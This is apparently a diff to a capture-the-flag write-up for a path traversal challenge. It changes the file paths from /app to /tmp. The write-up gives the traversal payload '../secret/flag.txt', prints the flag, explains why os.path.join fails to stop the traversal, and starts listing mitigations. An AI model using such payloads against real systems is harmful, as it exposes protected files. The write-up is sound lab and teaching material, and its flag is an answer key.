@@ -14,8 +14,8 @@ path = os.path.join(FILES_DIR, filename)
 
 ## Exploitation Steps
 
-1. The application expects files from `/app/files/` directory
-2. The flag is stored at `/app/secret/flag.txt`
+1. The application expects files from `/tmp/files/` directory
+2. The flag is stored at `/tmp/secret/flag.txt`
 3. Use `../` sequences to traverse up directories
 4. Navigate to: `/?file=../secret/flag.txt`
 
@@ -30,10 +30,10 @@ FCTF{p4th_tr4v3rs4l_g0es_brrrr}
 ```
 
 ## How It Works
-- `FILES_DIR = "/app/files"`
+- `FILES_DIR = "/tmp/files"`
 - User input: `../secret/flag.txt`
-- `os.path.join("/app/files", "../secret/flag.txt")` = `/app/files/../secret/flag.txt`
-- This resolves to: `/app/secret/flag.txt`
+- `os.path.join("/tmp/files", "../secret/flag.txt")` = `/tmp/files/../secret/flag.txt`
+- This resolves to: `/tmp/secret/flag.txt`
 
 ## Mitigation
 - Validate and sanitize file paths
